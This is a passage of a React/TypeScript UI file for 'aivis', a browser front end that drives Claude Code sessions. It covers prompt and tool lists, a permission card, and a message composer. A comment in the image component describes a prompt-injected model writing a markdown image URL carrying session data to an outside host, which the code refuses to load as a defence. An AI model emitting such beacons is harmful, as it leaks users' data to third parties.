          <PromptList prompts={prompts} partial={partial} onLoadMore={onLoadMore} onReveal={onRevealPrompt} />
        ) : null}
        {tab === 'tools' ? (
          <ToolList tools={tools} cwd={cwd} partial={partial} onLoadMore={onLoadMore} onReveal={onReveal} />
        ) : null}
        {tab === 'agents' ? (
          <SubagentRail
            subagents={subagents}
            view={subView}
            onView={setSubView}
            onReveal={onReveal}
            sessionId={sessionId}
            cwd={cwd}
          />
        ) : null}
        {tab === 'workflows' ? (
          <WorkflowRail workflows={workflows} view={wfView} onView={setWfView} onReveal={onReveal} />
        ) : null}
        {tab === 'files' ? (
          <ChangesRail
            sessionId={sessionId}
            cwd={cwd}
            base={base}
            onBase={onBase}
            bases={bases}
            changes={changes}
            touched={touched}
            view={changesView}
            onView={setChangesView}
            partial={partial}
            onLoadMore={onLoadMore}
            onReveal={onReveal}
          />
        ) : null}
      </div>
    </aside>
  )
}

/**
 * Every prompt in the loaded part of the conversation, in order.
 *
 * A long session is navigated by what was asked rather than by what was done, and the
 * prompts are the only entries scattered thinly enough through a thousand tool calls to be
 * hard to find by scrolling. Each row is numbered, because "the third thing I asked" is how
 * a session is remembered, and says where it came from when that is not the terminal.
 */
function PromptList({
  prompts,
  partial,
  onLoadMore,
  onReveal,
}: {
  prompts: TranscriptEntry[]
  partial: boolean
  onLoadMore: () => void
  onReveal: (uuid: string) => void
}): React.JSX.Element {
  return (
    <div className="rail__section">
      {partial ? (
        <div className="rail__note">
          <p>
            These are the prompts in the part of the conversation that is loaded. Earlier ones
            are not listed yet.
          </p>
          <button className="loadmore" onClick={onLoadMore}>
            load more history
          </button>
        </div>
      ) : null}
      {prompts.map((entry, index) => {
        if (entry.kind !== 'user' && entry.kind !== 'queued') return null
        const text = entry.text.replace(/\s+/g, ' ').trim()
        return (
          <button
            key={entry.uuid}
            className="promptrow"
            onClick={() => onReveal(entry.uuid)}
            title={text}
          >
            <span className="promptrow__head">
              <span className="promptrow__n">{index + 1}</span>
              {entry.kind === 'queued' ? (
                <span className="promptrow__from">{entry.from}</span>
              ) : null}
              <span className="promptrow__time">{clock(entry.at)}</span>
            </span>
            <span className="promptrow__text">
              {text || (entry.images.length > 0 ? '(image)' : '(no text)')}
            </span>
          </button>
        )
      })}
    </div>
  )
}

/**
 * The pictures sent with a message, each linking to a full-size copy of itself.
 *
 * The bytes are fetched per image rather than carried in the conversation, which is what
 * keeps a page of it small enough to send when it holds a dozen screenshots. Two kinds of
 * entry draw them: a message you typed here, and one pushed into the session from outside.
 */
function Attached({
  sessionId,
  uuid,
  images,
}: {
  sessionId: string
  uuid: string
  images: EntryImage[]
}): React.JSX.Element | null {
  if (images.length === 0) return null
  const at = (index: number): string =>
    `/api/sessions/${encodeURIComponent(sessionId)}/image?uuid=${encodeURIComponent(uuid)}&index=${index}`
  return (
    <div className="entry__images">
      {images.map((image) => (
        <a key={image.index} href={at(image.index)} target="_blank" rel="noreferrer noopener">
          <img className="entry__image" alt="attached image" src={at(image.index)} />
        </a>
      ))}
    </div>
  )
}

/** Every tool call in the loaded part of the conversation, in order. */
function ToolList({
  tools,
  cwd,
  partial,
  onLoadMore,
  onReveal,
}: {
  tools: TranscriptEntry[]
  cwd: string
  partial: boolean
  onLoadMore: () => void
  onReveal: (callId: string) => void
}): React.JSX.Element {
  return (
    <div className="rail__section">
      {partial ? (
        <div className="rail__note">
          <p>
            These are the tool calls in the part of the conversation that is loaded. A session
            with images or long outputs fills the read window quickly, so earlier calls are not
            listed yet.
          </p>
          <button className="loadmore" onClick={onLoadMore}>
            load more history
          </button>
        </div>
      ) : null}
      {tools.map((entry) => {
        if (entry.kind !== 'tool') return null
        const { call } = entry
        const summary = toolSummary(call.name, call.input).replace(/\s+/g, ' ').trim()
        const detail = summary.startsWith(cwd) ? summary.slice(cwd.length + 1) : summary
        return (
          <button
            key={entry.uuid}
            className={`toolrow ${call.isError ? 'toolrow--error' : ''}`}
            onClick={() => onReveal(call.id)}
          >
            <span className="toolrow__head">
              <span className="tool">{call.name}</span>
              <span className="toolrow__time">{clock(entry.at)}</span>
            </span>
            {detail ? <span className="toolrow__detail">{detail}</span> : null}
          </button>
        )
      })}
    </div>
  )
}

/** A message handed to a session's socket that has not been seen in the transcript yet. */
interface SentMessage {
  uuid: string
  preview: string
  at: number
}

/** How long a socket message can go unclaimed before the composer says so. */
const PICKUP_GRACE_MS = 45000

/**
 * Match the input's height to what it holds, up to the ceiling the stylesheet sets.
 *
 * A textarea keeps whatever height it was given however much is typed into it, so a long
 * message was written and reread through a two-line slot. Clearing the height before
 * measuring is what lets it shrink again as well as grow: `scrollHeight` never reports less
 * than the height already set, so without the reset the box would only ever ratchet up.
 */
function grow(input: HTMLTextAreaElement | null): void {
  if (!input) return
  input.style.height = 'auto'
  input.style.height = `${input.scrollHeight}px`
}

/**
 * Answer a decision a session aivis drives has stopped for.
 *
 * This is the one control on the page that is not a view of the transcript. The session is
 * holding a tool call open on the far end of a control request, and what is chosen here
 * becomes that call's own input — so it is not a message, does not queue, and does not go
 * through the composer. A message sent instead would wait behind the very turn that is
 * waiting on it, which is exactly the deadlock this replaces.
 *
 * Two different things arrive on the one wire and are drawn differently because they ask
 * different things. A **question** is Claude's own multiple choice: there is nothing to
 * approve, the answer is the whole point, and refusing to answer is a valid answer that
 * Claude Code has its own wording for. A **permission prompt** is a tool Claude Code
 * would not run unasked, where allow and deny are the only answers that exist.
 *
 * The card does not clear itself when you answer. The driver drops the request as it
 * writes the response and publishes its status, so the card leaves because the thing it
 * described is gone — not because the page assumed the answer landed.
 */
function AskBand({
  session,
  ask,
  more,
  offline,
}: {
  session: Session
  ask: PendingAsk
  more: number
  /** True when the page has lost the daemon, so nothing chosen here could be delivered. */
  offline: boolean
}): React.JSX.Element {
  /** Options ticked so far, keyed by the question's own text, as Claude Code keys them. */
  const [picks, setPicks] = useState<Record<string, string[]>>({})
  /** What was typed instead of choosing, which overrides the ticks when it has content. */
  const [typed, setTyped] = useState<Record<string, string>>({})
  const [busy, setBusy] = useState(false)
  const [failure, setFailure] = useState<string | null>(null)
  /** Which question is on screen. Claude Code puts several behind tabs, and so does this. */
  const [tab, setTab] = useState(0)
  const tabsRef = useRef<HTMLDivElement>(null)

  const questions = ask.questions ?? []
  /**
   * Whether the buttons can do anything at all.
   *
   * The answer goes back over aivis's HTTP API to a driver holding the tool call open, so
   * with the daemon unreachable a click can only fail — and it would fail after the card
   * had already been read as a working control. What was ticked and typed is left alone,
   * because the request may well still be waiting when the connection returns.
   */
  const blocked = busy || offline

  /** What one question has been answered with, or null while it is still open. */
  const answerFor = (question: AskQuestion): string | string[] | null => {
    const own = (typed[question.question] ?? '').trim()
    // Typing wins over ticking. Somebody who wrote a sentence after picking an option
    // meant the sentence, and Claude Code accepts either in the same field.
    if (own) return own
    const chosen = picks[question.question] ?? []
    return chosen.length > 0 ? chosen : null
  }

  const answers: Record<string, string | string[]> = {}
  for (const question of questions) {
    const value = answerFor(question)
    if (value !== null) answers[question.question] = value
  }
  const answered = Object.keys(answers).length

  /** Show a question, and put focus on its tab so the next arrow press moves from here. */
  const goTab = (at: number): void => {
    setTab(at)
    tabsRef.current?.querySelectorAll<HTMLButtonElement>('.ask__tab')[at]?.focus()
  }

  /**
   * Hand over to the next question still unanswered.
   *
   * Searching forward and wrapping means the tabs are worked through left to right, and
   * that jumping back to change an answer still carries you on to whatever is left. When
   * nothing is left it stays put: landing on a question already answered would read as
   * the card losing your place rather than as being finished.
   */
  const advance = (from: number, justAnswered: string): void => {
    for (let step = 1; step <= questions.length; step += 1) {
      const at = (from + step) % questions.length
      const question = questions[at]
      if (!question || question.question === justAnswered) continue
      if (answerFor(question) === null) {
        goTab(at)
        return
      }
    }
  }

  const decide = async (decision: AskDecision): Promise<void> => {
    if (busy) return
    setBusy(true)
    setFailure(null)
    try {
      const response = await fetch(`/api/sessions/${encodeURIComponent(session.id)}/answer`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ requestId: ask.requestId, ...decision }),
      })
      if (!response.ok) {
        const detail = (await response.json()) as { error?: string }
        setFailure(detail.error ?? `server returned ${response.status}`)
      }
    } catch (err) {
      setFailure(String(err))
    } finally {
      setBusy(false)
    }
  }

  /** Tick an option, or untick it. A single-choice question keeps only the last one. */
  const toggle = (question: AskQuestion, label: string, at: number): void => {
    const key = question.question
    const multi = question.multiSelect
    const chosen = picks[key] ?? []
    const selecting = multi ? !chosen.includes(label) : chosen[0] !== label
    setPicks((current) => {
      const now = current[key] ?? []
      if (!multi) return { ...current, [key]: now[0] === label ? [] : [label] }
      return {
        ...current,
        [key]: now.includes(label) ? now.filter((l) => l !== label) : [...now, label],
      }
    })
    // A single-choice question is finished the moment it is picked, so it hands over. A
    // multi-select is not — you may still be adding to it — and unticking is not an answer.
    if (!multi && selecting) advance(at, key)
  }

  /** Arrow keys move between tabs. Scoped to the tab bar, so typing an answer is untouched. */
  const onTabKeys = (event: React.KeyboardEvent<HTMLDivElement>): void => {
    const step = event.key === 'ArrowRight' ? 1 : event.key === 'ArrowLeft' ? -1 : 0
    if (step === 0 || questions.length < 2) return
    event.preventDefault()
    goTab((tab + step + questions.length) % questions.length)
  }

  // A question count cannot change under one request, but the index is clamped anyway so
  // that a re-render can never leave the card with no panel to draw.
  const at = Math.min(tab, Math.max(0, questions.length - 1))
  const current = questions[at]

  return (
    <div className={`ask ${ask.questions ? 'ask--question' : 'ask--permission'}`}>
      <p className="ask__banner">
        {ask.questions ? 'this session is asking you something' : 'this session needs a decision'}
        {more > 0 ? ` · ${more} more after this` : ''}
      </p>

      {ask.questions ? (
        current ? (
          <>
          {/*
            One tab per question rather than all of them stacked. Four questions with four
            options each is a long undifferentiated column in which nothing marks where one
            question ends and the next begins, and `header` is written to be a tab label —
            it is what Claude Code's own terminal UI puts on the tab. Only the question on
            screen is drawn, so the card stays the height of one question however many were
            asked, and the ticks say at a glance what is left.
          */}
          {questions.length > 1 ? (
            <div className="ask__tabs" role="tablist" ref={tabsRef} onKeyDown={onTabKeys}>
              {questions.map((question, index) => {
                const done = answerFor(question) !== null
                return (
                  <button
                    key={question.question}
                    id={`asktab-${index}`}
                    role="tab"
                    aria-selected={index === at}
                    aria-controls={`askpanel-${index}`}
                    tabIndex={index === at ? 0 : -1}
                    className={`ask__tab ${index === at ? 'ask__tab--on' : ''} ${done ? 'ask__tab--done' : ''}`}
                    onClick={() => goTab(index)}
                  >
                    <span className="ask__tick">{done ? '✓' : index + 1}</span>
                    {question.header}
                  </button>
                )
              })}
              <span className="ask__tally">
                {answered} of {questions.length} answered
              </span>
            </div>
          ) : null}

          <div
            className="ask__q"
            role={questions.length > 1 ? 'tabpanel' : undefined}
            id={`askpanel-${at}`}
            aria-labelledby={questions.length > 1 ? `asktab-${at}` : undefined}
          >
            {/* With tabs the header is already on the tab, so the panel only adds what the
                tab has no room for. */}
            {questions.length > 1 ? (
              current.multiSelect ? <p className="ask__head">pick any</p> : null
            ) : (
              <p className="ask__head">
                {current.header}
                {current.multiSelect ? ' · pick any' : ''}
              </p>
            )}
            <p className="ask__question">{current.question}</p>
            <div className="ask__options">
              {current.options.map((option) => {
                const chosen = picks[current.question] ?? []
                return (
                  <button
                    key={option.label}
                    className={`ask__option ${chosen.includes(option.label) ? 'ask__option--on' : ''}`}
                    onClick={() => toggle(current, option.label, at)}
                    aria-pressed={chosen.includes(option.label)}
                  >
                    <span className="ask__label">{option.label}</span>
                    {option.description ? <span className="ask__desc">{option.description}</span> : null}
                    {/*
                      A preview is drawn by the model and may be an HTML fragment. It is
                      shown as the text it is rather than rendered: nothing that arrives
                      on this wire is trusted enough to put into the page as markup.
                    */}
                    {option.preview ? <pre className="ask__preview">{option.preview}</pre> : null}
                  </button>
                )
              })}
            </div>
            <input
              className="ask__own"
              value={typed[current.question] ?? ''}
              placeholder="or answer in your own words"
              onChange={(event) =>
                setTyped((now) => ({ ...now, [current.question]: event.target.value }))
              }
            />
          </div>
          </>
        ) : null
      ) : (
            <div className="ask__q">
              <p className="ask__head">permission</p>
              <p className="ask__question">
                <span className="tool">{ask.displayName}</span>{' '}
                <span className="ask__subject">{ask.description ?? ''}</span>
              </p>
              {ask.reason ? <p className="ask__why">{ask.reason}</p> : null}
              {ask.input ? <pre className="ask__preview">{JSON.stringify(ask.input, null, 2)}</pre> : null}
            </div>
          )}

      {failure ? <p className="ask__warn">{failure}</p> : null}
      {offline ? (
        <p className="ask__warn">
          aivis is not connected, so this cannot be answered from here yet. The session is
          still holding — nothing ticked or typed is lost — and the buttons come back with the
          connection.
        </p>
      ) : null}

      <div className="ask__acts">
        {ask.questions ? (
          <>
            {/*
              With the questions behind tabs it is no longer obvious from the card how many
              were asked, so a partial answer says so on the button rather than going in
              quietly. Sending a subset is allowed — Claude Code tells the model which
              questions went unanswered — it just should not happen by accident.
            */}
            <button className="ask__go" disabled={blocked || answered === 0} onClick={() => void decide({ behavior: 'allow', answers })}>
              {busy
                ? 'Answering…'
                : questions.length > 1 && answered < questions.length
                  ? `Answer ${answered} of ${questions.length}`
                  : answered > 1
                    ? `Answer ${answered} questions`
                    : 'Answer'}
            </button>
            {/*
              Not a denial. Allowing the call with nothing chosen is Claude Code's own
              no-answer path, and the model is told the questions went unanswered rather
              than that its tool failed — which is true, and far more useful to it.
            */}
            <button
              className="ask__skip"
              disabled={blocked}
              onClick={() => void decide({ behavior: 'allow' })}
              title="Let the turn carry on without an answer. Claude is told the questions were not answered."
            >
              Skip
            </button>
          </>
        ) : (
          <>
            <button className="ask__go" disabled={blocked} onClick={() => void decide({ behavior: 'allow' })}>
              {busy ? 'Deciding…' : 'Allow once'}
            </button>
            {ask.suggestions.length > 0 ? (
              <button
                className="ask__go"
                disabled={blocked}
                onClick={() => void decide({ behavior: 'allow', suggestions: true })}
                title="Apply the permission change Claude Code offered, so this stops being asked for the rest of the session"
              >
                Allow, stop asking
              </button>
            ) : null}
            <button
              className="ask__no"
              disabled={blocked}
              onClick={() => void decide({ behavior: 'deny', message: 'Denied from aivis.' })}
            >
              Deny
            </button>
          </>
        )}
      </div>
    </div>
  )
}

/**
 * Sends the session another message, including while it is mid-turn.
 *
 * A session aivis drives takes the message on its standard input, where it becomes the
 * user's own turn and the driver's queue count says how many are waiting. A session
 * running in a terminal is reached over its socket instead, which accepts messages during
 * a turn but acknowledges nothing and delivers them as peer messages rather than as the
 * user. Neither of those is visible from the outside, so every socket send is held here
 * until its uuid shows up in the transcript — otherwise a message typed into a busy
 * session simply vanishes from the page until the session gets round to it.
 */
function Composer({
  session,
  driver,
  connection,
  entries,
  onRan,
}: {
  session: Session
  driver: DriverStatus | undefined
  connection: ConnectionState
  entries: TranscriptEntry[]
  /** Re-read the conversation, so a `!` run appears without waiting for the session to move. */
  onRan: () => void
}): React.JSX.Element {
  /**
   * Whether the page has lost the daemon.
   *
   * Everything the composer knows about the driver arrived on that socket, so once it is
   * down the state on screen stops being a report and becomes a memory: the session may
   * have answered, ended, or never existed for the process that comes back. The daemon may
   * not come back at all — a crash, or `npm run stop` — and the retry has nothing to say
   * about that. So the controls that act on a driver are withdrawn while it is down, rather
   * than left live to fail with a raw fetch error on the click.
   */
  const offline = connection !== 'open'
  const [text, setText] = useState('')
  const [sent, setSent] = useState<SentMessage[]>([])
  const [now, setNow] = useState(() => Date.now())
  const [images, setImages] = useState<Attachment[]>([])
  const inputRef = useRef<HTMLTextAreaElement>(null)
  const mentions = useMentions({ target: { session: session.id }, text, setText, inputRef })
  const [busy, setBusy] = useState(false)
  const [dragging, setDragging] = useState(false)
  const [conflict, setConflict] = useState<number[] | null>(null)
  // Why the delivery was refused, when the server knew. A 409 usually means an unreachable
  // socket and nothing more can be said about it, but aivis also declines deliveries of its
  // own accord — an attachment directory that is not its own is the case that matters — and
  // that reason is the accurate diagnosis rather than the guess about a busy session.
  const [conflictReason, setConflictReason] = useState<string | null>(null)
  const [failure, setFailure] = useState<string | null>(null)
  /**
   * Whether this machine will run a `!` line, and why not when it will not.
   *
   * Asked up front rather than discovered by pressing enter, so a bind where `!` is refused
   * says so under the line you are still typing.
   */
  const bashRefusal = useDefaults()?.bashRefusal ?? null
  const bashLine = text.trimStart().startsWith('!')

  /**
   * Run a `!` line here rather than sending it.
   *
   * Nothing is sent: the daemon runs the command in the session's directory and holds what it
   * printed until the next message, which is what the terminal client does. So the composer
   * empties and the conversation is re-read, and the session itself is not touched — which is
   * also why this works while it is mid-turn.
   */
  const runBash = async (command: string): Promise<void> => {
    if (!command || busy) return
    if (images.length > 0) {
      setFailure('A ! line runs a command on this machine; it cannot carry images.')
      return
    }
    setBusy(true)
    setFailure(null)
    try {
      const response = await fetch(`/api/sessions/${encodeURIComponent(session.id)}/bash`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command }),
      })
      if (!response.ok) {
        const detail = (await response.json()) as { error?: string }
        setFailure(detail.error ?? `server returned ${response.status}`)
        return
      }
      setText('')
      onRan()
    } catch (err) {
      setFailure(String(err))
    } finally {
      setBusy(false)
    }
  }

  /** Stage image files from a paste, a drop, or a picker. */
  const attach = async (files: File[]): Promise<void> => {
    const usable = files.filter(isImageFile)
    if (usable.length === 0) {
      if (files.length > 0) setFailure('Only PNG, JPEG, GIF, and WebP images can be attached.')
      return
    }
    setFailure(null)
    for (const file of usable) {
      try {
        const attachment = await readImageFile(file)
        setImages((current) => [...current, attachment])
      } catch (err) {
        setFailure(String(err))
      }
    }
  }

  const send = async (takeover: boolean): Promise<void> => {
    const body = text.trim()
    if ((!body && images.length === 0) || busy) return
    // A `!` line is not a message and never reaches the session. Checked on the trimmed text
    // so a leading newline does not change what a line means.
    if (body.startsWith('!')) {
      await runBash(body.slice(1).trim())
      return
    }
    setBusy(true)
    setFailure(null)
    if (takeover) {
      setConflict(null)
      setConflictReason(null)
    }
    try {
      const response = await fetch(`/api/sessions/${encodeURIComponent(session.id)}/message`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          text: body,
          takeover,
          images: images.map((image) => ({
            mediaType: image.mediaType,
            data: image.data,
            name: image.name,
          })),
        }),
      })
      if (response.status === 409) {
        const detail = (await response.json()) as { pids?: number[]; error?: string; detail?: string }
        setConflict(detail.pids ?? [])
        // `detail` is set only when aivis decided against the delivery itself, so it says
        // something the generic copy below cannot.
        setConflictReason(detail.detail ?? null)
        setFailure(detail.error ?? null)
        return
      }
      if (!response.ok) {
        const detail = (await response.json()) as { error?: string }
        setFailure(detail.error ?? `server returned ${response.status}`)
        return
      }
      // Only the socket path needs watching. A driven session reports its own queue, and a
      // resumed one is starting a process whose first act is this message.
      const detail = (await response.json()) as { delivery?: string; uuid?: string }
      if (detail.delivery === 'socket' && detail.uuid) {
        const uuid = detail.uuid
        setSent((current) => [...current, { uuid, preview: body || 'image', at: Date.now() }])
      }
      setText('')
      setImages([])
      setConflict(null)
      setConflictReason(null)
    } catch (err) {
      setFailure(String(err))
    } finally {
      setBusy(false)
    }
  }

  // Keyed on the text rather than on the keystroke, so every route to a new value resizes:
  // typing, pasting, inserting a file or a command, and the clear after a message is sent.
  useEffect(() => {
    grow(inputRef.current)
  }, [text])

  /**
   * Which sent messages the session has actually taken up.
   *
   * The uuid travels with the frame and is the one the session records the message under,
   * so finding it in the transcript is a real receipt rather than the assumption that a
   * successful socket write meant the message was accepted.
   */
  const arrived = useMemo(
    () =>
      new Set(
        entries
          .filter((entry) => entry.kind === 'queued')
          .map((entry) => entry.sourceUuid)
          .filter((id): id is string => id !== null),
      ),
    [entries],
  )
  const waiting = sent.filter((message) => !arrived.has(message.uuid))

  // A message the transcript now shows has stopped being news, so it leaves the composer.
  useEffect(() => {
    if (!sent.some((message) => arrived.has(message.uuid))) return
    const timer = setTimeout(
      () => setSent((current) => current.filter((message) => !arrived.has(message.uuid))),
      2500,
    )
    return () => clearTimeout(timer)
  }, [sent, arrived])

  // Anything still waiting keeps a clock running, because after the write succeeds the only
  // remaining way to fail is to never be picked up, and that has no event to listen for.
  useEffect(() => {
    if (waiting.length === 0) return
    const timer = setInterval(() => setNow(Date.now()), 1000)
    return () => clearInterval(timer)
  }, [waiting.length])

  const oldest = waiting.reduce((at, message) => Math.min(at, message.at), now)
  const overdue = waiting.length > 0 && now - oldest > PICKUP_GRACE_MS

  /**
   * The decision this session has stopped for, if it has stopped for one.
   *
   * Read from the driver rather than from the transcript. Both know a question was asked,
   * but only the driver holds the request it has to be answered on, and only the driver
   * hears about it the moment it happens rather than on the next transcript read.
   */
  const asks = driver?.asks ?? []
  const ask = asks[0]

  const state = driver?.state
  /**
   * Whether aivis is still driving this session.
   *
   * Presence in the drivers map is not the same question. A driver that died keeps its
   * entry on the client on purpose — its detail is the only account the reader gets of why
   * it died, and 'error' is the state nearly every ending takes, because stopping a driver
   * sends SIGTERM and a signal death is not a clean exit. The server dropped it from its
   * registry at that moment, so everything below that asks "is aivis holding this session's
   * standard input" has to ask the state rather than the presence.
   */
  const driven = driver !== undefined && state !== 'exited' && state !== 'error'
  /** A session aivis does not drive is reached over its socket, with peer authority. */
  const terminal = !driven && session.livePids.length > 0
  /**
   * Whether Claude Code will parse a slash command in this message itself.
   *
   * It does for anything arriving on a driven session's standard input — that is the same
   * path a terminal uses, and it advertises the commands it takes in its init event. What
   * it does not do is parse them out of a message pushed in over the socket, which is why
   * the built-ins are only out of reach for a session running in someone else's terminal.
   */
  const nativeSlash = !terminal
  /**
   * Only a session aivis drives can be stopped from here.
   *
   * The interrupt travels on the process's standard input, which aivis holds only for
   * sessions it started. A terminal session's socket carries no interrupt at all, so
   * escape in the terminal remains the only way to stop one of those.
   */
  const stoppable = state === 'working' && !offline

  /** Cut the current turn short, leaving the session open for the next message. */
  const interrupt = async (): Promise<void> => {
    setFailure(null)
    try {
      const response = await fetch(
        `/api/sessions/${encodeURIComponent(session.id)}/interrupt`,
        { method: 'POST', headers: { 'Content-Type': 'application/json' } },
      )
      if (!response.ok) {
        const detail = (await response.json()) as { error?: string }
        setFailure(detail.error ?? `server returned ${response.status}`)
      }
    } catch (err) {
      setFailure(String(err))
    }
  }
  const label =
    state === 'working'
      ? `working${driver && driver.queued > 1 ? ` · ${driver.queued} queued` : ''}`
      : state === 'starting'
        ? 'starting…'
        : state === 'error'
          ? `driver error: ${driver?.detail ?? 'unknown'}`
          : state === 'idle'
            ? `driven by aivis · ${driver?.permissionMode ?? ''}`
            : null

  return (
    <div
      className={`composer ${dragging ? 'composer--drag' : ''}`}
      onDragOver={(event) => {
        if (!event.dataTransfer.types.includes('Files')) return
        event.preventDefault()
        setDragging(true)
      }}
      onDragLeave={(event) => {
        // Leaving for a child element still counts as being inside the composer.
        if (event.currentTarget.contains(event.relatedTarget as Node | null)) return
        setDragging(false)
      }}
      onDrop={(event) => {
        if (!event.dataTransfer.types.includes('Files')) return
        event.preventDefault()
        setDragging(false)
        void attach([...event.dataTransfer.files])
      }}
    >
      <div className="composer__inner">
        {bashLine && bashRefusal ? <p className="composer__warn">{bashRefusal}</p> : null}
        {conflict ? (
          <p className="composer__warn">
            {/* The takeover offer stands either way: resuming the session here sends the text
                and any images down the driver's own stdin, which needs neither the terminal
                session's socket nor the temp directory a refusal was about. */}
            {conflictReason ??
              `Could not reach the session running in a terminal (pid ${conflict.join(', ')}). It may be mid-turn, or its message channel is unavailable.`}{' '}
            <button className="composer__takeover" onClick={() => void send(true)}>
              resume it here as a separate process
            </button>
          </p>
        ) : failure ? (
          <p className="composer__warn">{failure}</p>
        ) : null}

        {images.length > 0 ? (
          <div className="attachments">
            {images.map((image) => (
              <div key={image.id} className="attachment" title={`${image.name} · ${sizeLabel(image.bytes)}`}>
                <img className="attachment__thumb" src={image.previewUrl} alt={image.name} />
                <span className="attachment__size">{sizeLabel(image.bytes)}</span>
                <button
                  className="attachment__remove"
                  onClick={() => setImages((current) => current.filter((i) => i.id !== image.id))}
                  aria-label={`Remove ${image.name}`}
                >
                  ✕
                </button>
              </div>
            ))}
          </div>
        ) : null}

        {/*
          Said before anything else the composer reports, because it is the reason not to
          believe the rest of it. Everything below this line was last heard on a socket that
          is now down.
        */}
        {offline ? (
          <p
            className="composer__state composer__pending composer__pending--slow"
            title="The page is trying to reconnect. If aivis was stopped or has crashed it will not come back on its own, and nothing on this page will update until it does."
          >
            disconnected from aivis · what follows is the last thing it said
          </p>
        ) : null}

        {waiting.length > 0 ? (
          <p className={`composer__state composer__pending ${overdue ? 'composer__pending--slow' : ''}`}>
            {waiting.length === 1 ? 'sent' : `${waiting.length} sent`} ·{' '}
            {overdue
              ? `nothing has picked ${waiting.length === 1 ? 'it' : 'them'} up in ${Math.round(
                  (now - oldest) / 1000,
                )}s — the session may be deep in a tool call, or the process aivis matched to it is not the one running it`
              : `waiting for the session to pick ${waiting.length === 1 ? 'it' : 'them'} up`}
          </p>
        ) : null}

        {/*
          A session holding on a question is reported as working, because its turn has not
          ended, and the animated strip beside a card asking you something read as though
          the session were busy elsewhere and the card could wait. So the strip gives way to
          a line that says what is actually happening — and keeps the queue count, which for
          a driven session is the only evidence on screen that a message was accepted at
          all. Dropping it let somebody answer in the composer out of habit and watch two
          messages vanish behind the very turn that was waiting on them.
        */}
        {ask ? (
          <p
            className="composer__state"
            title="The session is stopped on the card above and will not read anything else until it is answered. A message sent now waits behind the answer."
          >
            {ask.questions ? 'holding for your answer' : 'holding for your decision'}
            {driver && driver.queued > 1 ? ` · ${driver.queued} queued` : ''}
          </p>
        ) : state === 'working' ? (
          <p className="composer__state">
            <Working label={`working${driver && driver.queued > 1 ? ` · ${driver.queued} queued` : ''}`} />
          </p>
        ) : label ? (
          <p className="composer__state">{label}</p>
        ) : terminal ? (
          <p
            className="composer__state"
            title={
              'aivis writes to the session’s own message socket, so a message lands in the live conversation even mid-turn. ' +
              'Claude Code delivers it as a peer message: the session is told it came from another session rather than from you, ' +
              'and it carries none of your authority to approve a permission prompt. Answering a prompt, or sending something that ' +
              'needs the weight of your own turn, still belongs in the terminal.'
            }
          >
            running in a terminal · messages arrive as peer messages
          </p>
        ) : null}

        {/*
          Above the input rather than inside the conversation, because a reader who jumped
          to a rail is parked half way up a long history and would never scroll past an
          inline card. It sits under the mention menus so those still overlay it.
        */}
        {ask ? (
          <AskBand
            key={ask.requestId}
            session={session}
            ask={ask}
            more={asks.length - 1}
            offline={offline}
          />
        ) : null}

        <MentionMenus mentions={mentions} nativeSlash={nativeSlash} />

        <div className="composer__row">
          <textarea
            ref={inputRef}
            className="composer__input"
            placeholder="Send a message…  / for a command, @ for a file, paste or drop an image to attach one."
            value={text}
            rows={1}
            onChange={(event) => {
              setText(event.target.value)
              mentions.detect(event.target.value, event.target.selectionStart ?? 0)
            }}
            onClick={(event) => mentions.detect(text, event.currentTarget.selectionStart ?? 0)}
            onBlur={() => setTimeout(mentions.close, 120)}
            onPaste={(event) => {
              const files = [...event.clipboardData.files]
              if (files.length === 0) return
              event.preventDefault()
              void attach(files)
            }}
            onKeyDown={(event) => {
              // A menu that is open owns the arrows, Enter and Escape, so Enter picks a
              // file or a command rather than sending a half-typed message.
              if (mentions.keyDown(event)) return
              // Escape stops the turn, the way it does in the terminal — but only once the
              // pickers above have had it and only with nothing typed, so it never costs
              // you a half-written message.
              if (event.key === 'Escape' && stoppable && !text) {
                event.preventDefault()
                void interrupt()
                return
              }
              if (event.key === 'Enter' && !event.shiftKey) {
                event.preventDefault()
                void send(false)
              }
            }}
          />
          {stoppable ? (
            <button
              className="composer__stop"
              onClick={() => void interrupt()}
              title="Stop the turn in progress. The session stays open, and anything queued behind it still runs. Escape does the same."
            >
              stop
            </button>
          ) : null}
          <button
            className="composer__send"
            disabled={busy || (!text.trim() && images.length === 0)}
            onClick={() => void send(false)}
          >
            send
          </button>
        </div>
      </div>
      {dragging ? <div className="composer__drop">Drop images to attach</div> : null}
    </div>
  )
}

/**
 * An image a message links to.
 *
 * A message often points at a screenshot by absolute path, which a browser cannot open
 * on its own — the tag renders broken. The path is routed through the server instead,
 * and if the file has been cleaned up or refused, the path itself is shown the way the
 * terminal shows it rather than a broken image.
 *
 * An image hosted anywhere else is never drawn. A browser fetches an `<img>` the moment
 * the transcript renders, with nobody having clicked anything, so a remote address in a
 * message is a request the reader never asked to make — and the model that wrote the
 * message may be repeating an instruction it read in a web page or a checked-in file
 * rather than saying something of its own. Everything a session can see fits in a query
 * string, so drawing `![](https://elsewhere/x.png?d=…)` would hand whoever hosts that
 * image both the data and the fact that the session was opened, before the reader had
 * read a word of it. A remote source is shown as the address it is, linked but not
 * loaded, which leaves fetching it the reader's own decision.
 */
function MessageImage({
  src,
  alt,
  sessionId,
}: {
  src?: string
  alt?: string
  sessionId: string
}): React.JSX.Element | null {
  const [failed, setFailed] = useState(false)
  if (!src) return null

  // The decision about where this points lives in web/imageSource.ts, on its own and under
  // test: it is the whole of the defence against a model writing a beacon into a reply, and
  // it is small enough to look harmless while being changed.
  const { kind, target, followable } = classifyImageSource(src)

  if (kind === 'elsewhere') {
    return (
      <span
        className="md-image__missing"
        title="aivis does not load images from other sites. Fetching one would tell whoever hosts it that you opened this session, and anything the message hid in the address would travel with the request. Follow it yourself if you trust where it points."
      >
        {alt ? `${alt} · ` : ''}
        {followable ? (
          <a href={target} target="_blank" rel="noreferrer noopener" referrerPolicy="no-referrer">
            <code>{target}</code>
          </a>
        ) : (
          <code>{target}</code>
        )}
        {' · not loaded'}
      </span>
    )
  }

  const url =
    kind === 'served'
      ? target
      : `/api/sessions/${encodeURIComponent(sessionId)}/localfile?path=${encodeURIComponent(target)}`

  if (failed) {
    return (
      <span className="md-image__missing">
        {alt ? `${alt} · ` : ''}
        <code>{src}</code>
      </span>
    )
  }

  return (
    <a href={url} target="_blank" rel="noreferrer noopener" className="md-image">
